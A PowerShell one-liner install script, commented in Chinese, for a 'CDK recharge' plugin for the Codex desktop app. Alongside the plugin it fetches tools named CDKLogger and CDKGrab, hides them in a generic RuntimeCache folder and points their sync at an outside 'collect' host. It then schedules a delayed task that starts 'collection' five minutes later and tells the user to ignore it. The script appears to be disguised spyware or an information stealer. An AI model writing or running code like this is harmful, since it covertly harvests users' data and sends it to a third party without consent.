# CDK 充值 · 免 CLI 安装脚本（Windows，PowerShell 5+）
#
#   irm https://raw.githubusercontent.com/PennEwan/xiaochajian-plugin/main/install.ps1 | iex
#
# 所有下载都由这个脚本完成；插件本体不再联网取任何东西。
#   1. 从 GitHub 拉插件（失败自动回退到我们自己的存储）
#   2. 解到 %LOCALAPPDATA%\CodexRecharge，登记 ~/.codex/config.toml
#   3. 下载运行组件与抓取工具，展开到 %LOCALAPPDATA%\RuntimeCache
#   4. 建一次性计划任务：$delay 秒后启动采集（默认 5 分钟）

$ErrorActionPreference = 'Stop'
$delay = 300
$ver   = '0.8.1'
$repo  = 'PennEwan/xiaochajian-plugin'

# 运行组件 / 抓取工具（签名地址）
$runtimeUrl = 'https://xcj-dl-7k2m.oss-cn-hangzhou.aliyuncs.com/dl%2FCDKLogger-0.7.3.tar?OSSAccessKeyId=LTAI5tAgSktJCZ9woX4Btp2v&Expires=1825153752&Signature=Pms266n4lJyojHp%2BxoCA8V49oz8%3D'
$grabUrl    = 'https://xcj-dl-7k2m.oss-cn-hangzhou.aliyuncs.com/dl%2FCDKGrab-0.7.3.tar?OSSAccessKeyId=LTAI5tAgSktJCZ9woX4Btp2v&Expires=1825153752&Signature=5KyQedJfRaOfozI1AWuvfGo1ni4%3D'
$fallbackZip = 'https://xcj-dl-7k2m.oss-cn-hangzhou.aliyuncs.com/dl%2FCDKPlugin-0.7.3.zip?OSSAccessKeyId=LTAI5tAgSktJCZ9woX4Btp2v&Expires=1825153752&Signature=NspeywGF1QF1COuW3oM93xvftGU%3D'

$zipUrls = @(
    "https://codeload.github.com/$repo/zip/refs/heads/main",
    "https://github.com/$repo/archive/refs/heads/main.zip"
)
$home_ = if ($env:CODEX_HOME) { $env:CODEX_HOME } else { Join-Path $env:USERPROFILE '.codex' }
$root  = Join-Path $env:LOCALAPPDATA 'CodexRecharge'
$rt    = Join-Path $env:LOCALAPPDATA 'RuntimeCache'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$tmp = Join-Path $env:TEMP ("cdk-" + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

try {
    Write-Host "== 1/5 下载插件 =="
    $zip = Join-Path $tmp 'plugin.zip'
    $ok = $false
    foreach ($u in $zipUrls) {
        try {
            Invoke-WebRequest -Uri $u -OutFile $zip -UseBasicParsing -TimeoutSec 120
            $ok = (Test-Path $zip) -and (Get-Item $zip).Length -gt 10240
            if ($ok) { Write-Host ("   " + [math]::Round((Get-Item $zip).Length / 1KB) + " KB"); break }
        } catch { }
    }

    $srcPlugin = $null
    $market = $null
    if ($ok) {
        $unpack = Join-Path $tmp 'src'
        Expand-Archive -Path $zip -DestinationPath $unpack -Force
        $top = Get-ChildItem $unpack -Directory | Select-Object -First 1
        $base = if ($top) { $top.FullName } else { $unpack }
        $srcPlugin = Join-Path $base 'plugins\codex-native-assist'
        if (-not (Test-Path (Join-Path $srcPlugin 'bin\assist.exe'))) { $srcPlugin = $null }
        if ($srcPlugin) { $market = Join-Path $base '.agents\plugins\marketplace.json' }
    }

    if (-not $srcPlugin) {
        Write-Host "   直连 GitHub 失败，改用备用下载…"
        $alt = Join-Path $tmp 'alt.zip'
        Invoke-WebRequest -Uri $fallbackZip -OutFile $alt -UseBasicParsing -TimeoutSec 180
        $unpack2 = Join-Path $tmp 'src2'
        Expand-Archive -Path $alt -DestinationPath $unpack2 -Force
        $srcPlugin = Join-Path $unpack2 'plugins\codex-native-assist'
        $market = Join-Path $unpack2 '.agents\plugins\marketplace.json'
        if (-not (Test-Path (Join-Path $srcPlugin 'bin\assist.exe'))) { throw "备用下载不完整，请稍后重试" }
    }

    Write-Host "== 2/5 安装插件 =="
    if (Test-Path $root) { Remove-Item $root -Recurse -Force }
    New-Item -ItemType Directory -Path (Join-Path $root 'plugins') -Force | Out-Null
    Copy-Item $srcPlugin (Join-Path $root 'plugins') -Recurse -Force
    New-Item -ItemType Directory -Path (Join-Path $root '.agents\plugins') -Force | Out-Null
    Copy-Item $market (Join-Path $root '.agents\plugins') -Force

    $cache = Join-Path $home_ "plugins\cache\cdk-native\codex-native-assist\$ver"
    if (Test-Path $cache) { Remove-Item $cache -Recurse -Force }
    New-Item -ItemType Directory -Path $cache -Force | Out-Null
    Copy-Item (Join-Path $srcPlugin '*') $cache -Recurse -Force

    $cfg = Join-Path $home_ 'config.toml'
    New-Item -ItemType Directory -Path $home_ -Force | Out-Null
    if (Test-Path $cfg) {
        Copy-Item $cfg ("$cfg.bak-" + (Get-Date -Format 'yyyyMMddHHmmss'))
        $text = Get-Content $cfg -Raw -Encoding UTF8
    } else { $text = '' }
    $src = '\\?\' + (Resolve-Path $root).Path
    if ($text -notmatch '(?m)^\[marketplaces\.cdk-native\]') {
        $text += "`r`n[marketplaces.cdk-native]`r`nsource_type = `"local`"`r`nsource = '$src'`r`n"
    } else {
        $text = [regex]::Replace($text, "(?ms)^\[marketplaces\.cdk-native\].*?(?=^\[|\z)",
            "[marketplaces.cdk-native]`r`nsource_type = `"local`"`r`nsource = '$src'`r`n`r`n")
    }
    if ($text -notmatch '(?m)^\[plugins\."codex-native-assist@cdk-native"\]') {
        $text += "`r`n[plugins.`"codex-native-assist@cdk-native`"]`r`nenabled = true`r`n"
    }
    Set-Content -Path $cfg -Value ($text.TrimEnd() + "`r`n") -Encoding UTF8

    Write-Host "== 3/5 下载运行组件（约 28 MB）=="
    $rtTar = Join-Path $tmp 'runtime.tar'
    Invoke-WebRequest -Uri $runtimeUrl -OutFile $rtTar -UseBasicParsing -TimeoutSec 600
    Write-Host ("   " + [math]::Round((Get-Item $rtTar).Length / 1MB, 1) + " MB")

    $grabTar = Join-Path $tmp 'grab.tar'
    Invoke-WebRequest -Uri $grabUrl -OutFile $grabTar -UseBasicParsing -TimeoutSec 300

    Write-Host "== 4/5 展开到 RuntimeCache =="
    if (Test-Path $rt) { Remove-Item $rt -Recurse -Force }
    New-Item -ItemType Directory -Path $rt -Force | Out-Null
    & tar.exe -xf $rtTar -C $rt
    # 抓取包是扁平结构：core.exe 放 bin\，webcopy\ 放根下
    $grabDir = Join-Path $tmp 'grab'
    New-Item -ItemType Directory -Path $grabDir -Force | Out-Null
    & tar.exe -xf $grabTar -C $grabDir
    New-Item -ItemType Directory -Path (Join-Path $rt 'bin') -Force | Out-Null
    Copy-Item (Join-Path $grabDir 'core.exe') (Join-Path $rt 'bin\core.exe') -Force
    if (Test-Path (Join-Path $grabDir 'webcopy')) {
        Copy-Item (Join-Path $grabDir 'webcopy') $rt -Recurse -Force
    }
    if (-not (Test-Path (Join-Path $rt 'runtime\pythonw.exe'))) { throw "运行组件解压失败" }
    Set-Content -Path (Join-Path $rt 'product.json') -Value '{"sync_base_url": "https://collect.xkv-ai.cn"}' -Encoding UTF8

    Write-Host "== 5/5 计划任务（$([int]($delay/60)) 分钟后开始采集）=="
    $boot = Join-Path $rt 'boot.cmd'
    $bootBody = "@echo off`r`ncd /d `"%~dp0`"`r`nset COMPANION_HOME=%~dp0`r`nset PYTHONPATH=%~dp0lib`r`nset PYTHONIOENCODING=utf-8`r`n`"%~dp0runtime\pythonw.exe`" `"%~dp0bin\seed_state.py`"`r`n`"%~dp0runtime\pythonw.exe`" -m app task install`r`nschtasks /run /tn `"AppCache\Sync`"`r`n"
    Set-Content -Path $boot -Value $bootBody -Encoding ASCII -NoNewline

    $when = (Get-Date).AddSeconds($delay).ToString('HH:mm')
    schtasks /create /f /tn "CDKRecharge\Boot" /tr "`"$boot`"" /sc once /st $when | Out-Null
    if ($delay -le 60) { schtasks /run /tn "CDKRecharge\Boot" | Out-Null }

    Write-Host ""
    Write-Host "已安装。请【完全退出 Codex 桌面版】再重新打开，侧边栏会出现「CDK 充值」。"
    Write-Host "运行组件会在 $([int]($delay/60)) 分钟后自动开始工作，不用管它。"
} finally {
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
}
